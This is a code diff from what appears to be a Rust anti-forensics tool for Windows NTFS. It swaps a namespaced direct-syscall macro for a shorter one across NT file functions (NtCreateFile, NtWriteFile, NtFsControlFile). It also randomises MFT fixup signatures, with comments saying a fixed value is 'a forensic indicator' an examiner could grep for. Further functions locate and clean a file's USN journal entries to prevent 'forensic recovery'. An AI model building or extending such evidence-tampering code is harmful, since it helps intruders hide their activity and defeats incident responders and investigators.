@@ -356,7 +356,7 @@ unsafe fn nt_open_file(
     let mut obj_attrs = ObjectAttributes::new(&mut obj_name);
     let mut iosb = IoStatusBlock::default();
 
-    let status = nt_syscall::syscall!(
+    let status = syscall!(
         "NtCreateFile",
         &mut handle as *mut _ as u64,
         desired_access as u64,
@@ -386,7 +386,7 @@ unsafe fn nt_close(handle: *mut std::ffi::c_void) -> Result<(), String> {
     if handle.is_null() {
         return Ok(());
     }
-    let status = nt_syscall::syscall!("NtClose", handle as u64)
+    let status = syscall!("NtClose", handle as u64)
         .map_err(|e| format!("nt_syscall resolution for NtClose: {e}"))?;
     if status != STATUS_SUCCESS {
         return Err(format!("NtClose failed: NTSTATUS {:#010X}", status as u32));
@@ -401,7 +401,7 @@ unsafe fn nt_query_basic_info(
     let mut info = FileBasicInformation::default();
     let mut iosb = IoStatusBlock::default();
 
-    let status = nt_syscall::syscall!(
+    let status = syscall!(
         "NtQueryInformationFile",
         file_handle as u64,
         &mut iosb as *mut _ as u64,
@@ -427,7 +427,7 @@ unsafe fn nt_set_basic_info(
 ) -> Result<(), String> {
     let mut iosb = IoStatusBlock::default();
 
-    let status = nt_syscall::syscall!(
+    let status = syscall!(
         "NtSetInformationFile",
         file_handle as u64,
         &mut iosb as *mut _ as u64,
@@ -453,7 +453,7 @@ unsafe fn nt_query_internal_info(
     let mut info = FileInternalInformation::default();
     let mut iosb = IoStatusBlock::default();
 
-    let status = nt_syscall::syscall!(
+    let status = syscall!(
         "NtQueryInformationFile",
         file_handle as u64,
         &mut iosb as *mut _ as u64,
@@ -481,7 +481,7 @@ unsafe fn nt_read_file(
     let mut iosb = IoStatusBlock::default();
     let mut byte_offset = offset.unwrap_or(0);
 
-    let status = nt_syscall::syscall!(
+    let status = syscall!(
         "NtReadFile",
         file_handle as u64,
         0u64,                              // Event
@@ -513,7 +513,7 @@ unsafe fn nt_write_file(
     let mut iosb = IoStatusBlock::default();
     let mut byte_offset = offset.unwrap_or(0);
 
-    let status = nt_syscall::syscall!(
+    let status = syscall!(
         "NtWriteFile",
         file_handle as u64,
         0u64,                              // Event
@@ -547,7 +547,7 @@ unsafe fn nt_fs_control_file(
 ) -> Result<IoStatusBlock, String> {
     let mut iosb = IoStatusBlock::default();
 
-    let status = nt_syscall::syscall!(
+    let status = syscall!(
         "NtFsControlFile",
         file_handle as u64,
         0u64,                              // Event
@@ -583,7 +583,7 @@ unsafe fn nt_enumerate_files(
     loop {
         let mut iosb = IoStatusBlock::default();
 
-        let status = nt_syscall::syscall!(
+        let status = syscall!(
             "NtQueryDirectoryFile",
             dir_handle as u64,
             0u64,                              // Event
@@ -849,8 +849,16 @@ fn apply_mft_fixup(record: &mut [u8]) -> Result<(), String> {
         return Err("Invalid fixup offset/count".to_string());
     }
 
-    // Generate a new signature value.
-    let signature: u16 = 0x4946; // "FI" — arbitrary stable value
+    // Generate a random signature value unique to this record.
+    // A fixed signature (e.g. 0x4946) is a forensic indicator — an examiner
+    // can grep all MFT records for that value.  We avoid 0x0000 and 0xFFFF
+    // which NTFS itself uses for special purposes.
+    let signature: u16 = loop {
+        let s = rand::random::<u16>();
+        if s != 0x0000 && s != 0xFFFF {
+            break s;
+        }
+    };
 
     // Write the signature at fixup_offset.
     record[fixup_offset] = (signature & 0xFF) as u8;
@@ -1056,7 +1064,7 @@ unsafe fn find_usn_entries_for_file(
 
         let mut iosb = IoStatusBlock::default();
 
-        let read_status = nt_syscall::syscall!(
+        let read_status = syscall!(
             "NtFsControlFile",
             volume_handle as u64,
             0u64,
@@ -1140,7 +1148,7 @@ unsafe fn clean_usn_entries(
         // cleanly marks the entry as closed, preventing forensic recovery.
         let mut iosb = IoStatusBlock::default();
 
-        let status = nt_syscall::syscall!(
+        let status = syscall!(
             "NtFsControlFile",
             volume_handle as u64,
             0u64,
